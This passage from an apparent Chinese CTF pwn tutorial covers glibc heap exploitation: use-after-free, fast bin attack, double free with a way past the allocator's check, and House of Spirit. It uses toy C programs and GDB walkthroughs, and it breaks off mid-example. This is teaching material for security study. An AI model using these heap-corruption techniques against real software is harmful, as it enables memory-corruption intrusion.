printed..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A829.png" alt="CTF - PWN_堆相关的漏洞与利用29.png"></p><ul><li><p>即使 <code>free</code> 掉了 <code>chunk a</code>，我们依然可以通过 <code>a -&gt; func(&quot;I can also use it&quot;)</code> 调用 <code>myprint()</code> 打印输出  </p></li><li><p>即使 <code>free</code> 掉了 <code>chunk a</code>，将 <code>a -&gt; func</code> 修改为 <code>printmyname()</code>，也可以正常使用 <code>printf(&quot;call print my name\n&quot;)</code> 功能</p></li><li><p>但是当 <code>chunk a</code> 被置为 NULL 后，<code>a -&gt; func(&quot;can not be printed...&quot;)</code> 便无法使用</p></li></ul><p>接下来，我们通过 GDB 调试分析一下整个过程</p><p>在执行 <code>free(a)</code> 之前，堆布局如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A830.png" alt="CTF - PWN_堆相关的漏洞与利用30.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A831.png" alt="CTF - PWN_堆相关的漏洞与利用31.png"></p><p>执行 <code>free(a)</code> 后，<code>chunk a</code> 被置于 <code>fast bin</code> 中</p><p><strong><code>myname</code> 指针被置为 NULL，但 <code>func</code> 指针未发生变化</strong>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A832.png" alt="CTF - PWN_堆相关的漏洞与利用32.png"></p><p>此时通过 <code>a -&gt; func(&quot;I can also use it&quot;)</code> 依然可以调用 <code>myprint()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A833.png" alt="CTF - PWN_堆相关的漏洞与利用33.png"></p><p>当我们将 <code>func</code> 指针修改为 <code>printmyname()</code> 后，通过 <code>a -&gt; func(&quot;this is my function&quot;)</code> 也可以调用 <code>printmyname()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A834.png" alt="CTF - PWN_堆相关的漏洞与利用34.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A835.png" alt="CTF - PWN_堆相关的漏洞与利用35.png"></p><p>当我们通过 <code>a = NULL</code> 将其置为 NULL 后，<strong>堆的布局并未发生变化</strong>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A836.png" alt="CTF - PWN_堆相关的漏洞与利用36.png"></p><p>但当我们再次使用 <code>a -&gt; func(&quot;can not be printed...&quot;)</code> 的时候</p><p>**程序会直接报出段错误，而不是继续调用 <code>0x4005d1</code> 地址处的 <code>printmyname()</code>**：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A837.png" alt="CTF - PWN_堆相关的漏洞与利用37.png"></p><blockquote><p>发生段错误的关键在于：</p><p>我们前面执行 <code>a = NULL</code> 的时候将 RBP - 8 地址处置为了 0，因此执行 <code>mov rax, qword ptr [rbp - 8]</code> 时 RAX &#x3D; 0，此时执行 <code>mov rax, qword ptr [rax + 8]</code> 要求从内存地址为 8 的地方取值赋给 RAX，显然这个内存地址是错误的</p></blockquote><hr><h1 id="Fast-bin-Attack"><a href="#Fast-bin-Attack" class="headerlink" title="Fast bin Attack"></a>Fast bin Attack</h1><blockquote><p>Fast bin Attack 是一类漏洞的利用方法，是指所有基于 <code>fast bin</code> 机制的漏洞利用方法</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">Fastbin Attack - CTF Wiki</a></p></blockquote><p>Fast bin Attack 利用的前提：</p><ul><li>存在堆溢出、UAF 等能控制 <code>chunk</code> 内容的漏洞  </li><li>漏洞发生于 <code>fast bin</code> 类型的 <code>chunk</code> 中</li></ul><p>由于 <code>fast bin</code> 使用单链表来维护释放的堆块，并且<strong>由 <code>fast bin</code> 管理的 <code>chunk</code> 即使被释放，其 <code>next_chunk</code> 的 <code>prev_inuse</code> 位也不会被清空</strong></p><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">,</span> <span class="token operator">*</span>chunk3<span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 进行释放</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行三次 <code>free</code> 进行释放后</p><p>此时位于 <code>main_arena</code> 中的 <code>fastbin</code> 链表中已经储存了指向 <code>chunk3</code> 的指针（最近释放），并且 <code>chunk3</code>、<code>chunk2</code>、<code>chunk1</code> 构成了一个单链表：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A851.png" alt="CTF - PWN_堆相关的漏洞与利用51.png"></p><hr><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><blockquote><p>Double free 指同一个指针指向的内存被 <code>free</code> 两次</p><p>堆上的某块内存被释放后，如果没有将指向该堆块的指针清零，就可以利用程序的其他部分对该内存进行再次的 <code>free</code>，<strong>最终得到一个可用的空闲块指针，并且能够修改已经被释放的空闲块中的内容</strong>，从而利用这个漏洞实现<strong>任意地址写</strong></p><p>参考文章：<a href="https://www.anquanke.com/post/id/241598">堆利用系列之堆漏洞-安全客 - 安全资讯平台</a></p></blockquote><p>总的来说，double free 就是通过 2 次 <code>free</code>，2 次 <code>malloc</code>，再 1 次 <code>free</code>，最终得到可用的空闲块指针，并且可以修改空闲块中的内容</p><p>详细来说就是：</p><ol><li>首先两次 <code>free</code> 同一块地址（两次 <code>free</code> 之间需要先 <code>free</code> 一次其他的 <code>chunk</code> 来绕过检测）  </li><li>然后再连续两次 <code>malloc</code> 相同大小  </li><li>然后再 <code>free</code> 掉其中一个</li><li>那么剩下那个指针指向的就是空闲块的 <code>chunk</code>，而且还是可以被修改的</li></ol><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>ptr0<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">;</span>    ptr0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk1</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk2</span>    ptr2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk3</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data0 <span class="token operator">=</span> <span class="token string">"00000000"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data1 <span class="token operator">=</span> <span class="token string">"11111111"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data2 <span class="token operator">=</span> <span class="token string">"22222222"</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr2<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk1: ptr0 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr0<span class="token punctuation">,</span> ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk2: ptr1 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr1<span class="token punctuation">,</span> ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk3: ptr2 @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr2<span class="token punctuation">,</span> ptr2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr0<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// double free</span>    <span class="token keyword">char</span> <span class="token operator">*</span>ptr3<span class="token punctuation">,</span> <span class="token operator">*</span>ptr4<span class="token punctuation">,</span> <span class="token operator">*</span>ptr5<span class="token punctuation">;</span>    ptr3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk4</span>    ptr4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk5</span>    ptr5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// chunk6</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr3<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr5<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk4: ptr3 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr3<span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk5: ptr4 @ %p\t contains: %s\n"</span><span class="token punctuation">,</span> ptr4<span class="token punctuation">,</span> ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk6: ptr5 @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr3 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk4: ptr3 @ %p\n"</span><span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk6: ptr5 @ %p\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data3 <span class="token operator">=</span> <span class="token string">"15935728"</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>ptr5<span class="token punctuation">,</span> data3<span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Chunk5: @ %p\t contains: %s\n\n"</span><span class="token punctuation">,</span> ptr5<span class="token punctuation">,</span> ptr5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们通过 GDB 调试观察一下整个执行流程</p><p>刚开始创建三个堆块 <code>ptr0</code>、<code>ptr1</code> 和 <code>ptr2</code>，并通过 <code>data0</code>、<code>data1</code>、<code>data2</code> 进行赋值：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A838.png" alt="CTF - PWN_堆相关的漏洞与利用38.png"></p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk1<span class="token operator">:</span> ptr0 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">00000000</span>Chunk2<span class="token operator">:</span> ptr1 @ <span class="token number">0x602050</span> contains<span class="token operator">:</span> <span class="token number">11111111</span>Chunk3<span class="token operator">:</span> ptr2 @ <span class="token number">0x602090</span> contains<span class="token operator">:</span> <span class="token number">22222222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>首先 <code>free</code> 掉 <code>ptr0</code> 和 <code>ptr1</code>，它们都被置于 <code>fast bin</code> 中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A839.png" alt="CTF - PWN_堆相关的漏洞与利用39.png"></p><p><code>ptr1</code> 的 <code>fd</code> 指针指向下一个空闲的 <code>chunk</code>，即：<code>ptr0</code> 的地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A842.png" alt="CTF - PWN_堆相关的漏洞与利用42.png"></p><blockquote><p>注意：</p><p>在对 <code>ptr0</code> 的 double free 之间，我们穿插了一个 <code>free(ptr1)</code> 的操作，这么做不是毫无根据的，而是为了绕过检测</p><p>因为在不同版本的 <code>malloc</code> 中，可能存在对 double free 的检测：<strong>如果当前被释放的指针与最后一个释放的内存块相同，程序将停止执行</strong></p><p>而 <code>fast bin</code> 在执行 <code>free</code> 的时候仅验证了 <code>main_arena</code> 直接指向的块，即链表指针头部的块，对于链表后面的块，并没有进行验证</p><p>因此，绕过这个检测的方法就是：<strong>在两次释放同一个指针之间释放另一个指针</strong>（但是在 Glibc 2.27 中，它将命中 <code>tcache</code>，就不存在这个问题）</p></blockquote><p>为了实现 double free，我们再次 <code>free</code> 掉 <code>ptr0</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A840.png" alt="CTF - PWN_堆相关的漏洞与利用40.png"></p><p>此时 <code>ptr1</code> 的 <code>fd</code> 指针指向 <code>ptr0</code> 的地址，同时 <code>ptr0</code> 的 <code>fd</code> 指针也指向 <code>ptr1</code> 的地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A841.png" alt="CTF - PWN_堆相关的漏洞与利用41.png"></p><p>接下来，我们将分配三个新内存块，大小与我们释放的内存块相同</p><p>执行完 <code>ptr3 = malloc(0x30)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A843.png" alt="CTF - PWN_堆相关的漏洞与利用43.png"></p><p>执行完 <code>ptr4 = malloc(0x30)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A844.png" alt="CTF - PWN_堆相关的漏洞与利用44.png"></p><p>执行完 <code>ptr5 = malloc(0x30)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A845.png" alt="CTF - PWN_堆相关的漏洞与利用45.png"></p><p>向它们写入 <code>data0</code>、<code>data1</code>、<code>data2</code> 的数据，这将使我们得到之前释放的三个内存块</p><p>执行完 <code>memcpy(ptr3, data0, 0x8)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A846.png" alt="CTF - PWN_堆相关的漏洞与利用46.png"></p><p>执行完 <code>memcpy(ptr4, data1, 0x8)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A847.png" alt="CTF - PWN_堆相关的漏洞与利用47.png"></p><p>执行完 <code>memcpy(ptr5, data2, 0x8)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A848.png" alt="CTF - PWN_堆相关的漏洞与利用48.png"></p><p>可以看到，向 <code>ptr5</code> 中写入的数据实际写入到了 <code>chunk4</code> 中</p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk4<span class="token operator">:</span> ptr3 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">22222222</span>Chunk5<span class="token operator">:</span> ptr4 @ <span class="token number">0x602050</span> contains<span class="token operator">:</span> <span class="token number">11111111</span>Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">22222222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>到这里可以发现，<strong>由于前面两次释放了同一个指针，现在我们分配到了相同的指针</strong>（因为 <code>malloc</code> 会出于性能提升的原因重用相似大小的已释放内存块）</p></blockquote><p><em>现在我们可以释放指向 <code>chunk4</code> 或 <code>chunk6</code> 的其中一个指针（即：<code>ptr3</code> 或 <code>ptr5</code>），并清除该指针（防止使用释放后的指针），而我们仍然会有一个指针指向同一个内存块，而该内存块现在已被释放</em></p><p><mark>也就是说，我们可以利用 double free 来编辑已释放的内存块</mark></p><p>执行 <code>free(ptr3)</code> 并将 <code>ptr3</code> 置为 NULL 后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A849.png" alt="CTF - PWN_堆相关的漏洞与利用49.png"></p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk4<span class="token operator">:</span> ptr3 @ <span class="token punctuation">(</span>nil<span class="token punctuation">)</span>Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过 <code>memcpy(ptr5, data3, 0x8)</code> 向 <code>ptr5</code> 写入数据时，<strong>会将数据写入到已经被释放的 <code>chunk4</code> 中</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A850.png" alt="CTF - PWN_堆相关的漏洞与利用50.png"></p><p>此时输出信息：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Chunk6<span class="token operator">:</span> ptr5 @ <span class="token number">0x602010</span> contains<span class="token operator">:</span> <span class="token number">15935728</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><blockquote><p>House of Spirit 是 the Malloc Maleficarum 中的一种技术，其核心在于：<strong>在目标位置处伪造 <code>fast bin chunk</code>，并将其释放，从而实现分配指定地址的 <code>chunk</code></strong></p></blockquote><p>要想构造 <code>fast bin fake chunk</code> 并且将其释放时，可以将其放入到对应的 <code>fast bin</code> 链表中，但需要绕过一些必要的检测：</p><ul><li><code>fake chunk</code> 的 <code>ISMMAP</code> 位不能为 1，因为 <code>free</code> 时，如果是 <code>mmap</code> 的 <code>chunk</code>，会单独处理</li><li><code>fake chunk</code> 地址需要对齐，<code>MALLOC_ALIGN_MASK</code></li><li><code>fake chunk</code> 的 <code>size</code> 大小需要满足对应的 <code>fast bin</code> 的需求，同时也得对齐</li><li><code>fake chunk</code> 的 <code>next chunk</code> 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></li><li><code>fake chunk</code> 对应的 <code>fast bin</code> 链表头部不能是该 <code>fake chunk</code>，即不能构成 <code>double free</code> 的情况</li></ul><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates the house of spirit attack.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Calling malloc() once so that it sets up its memory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>    <span class="token comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_chunks<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. 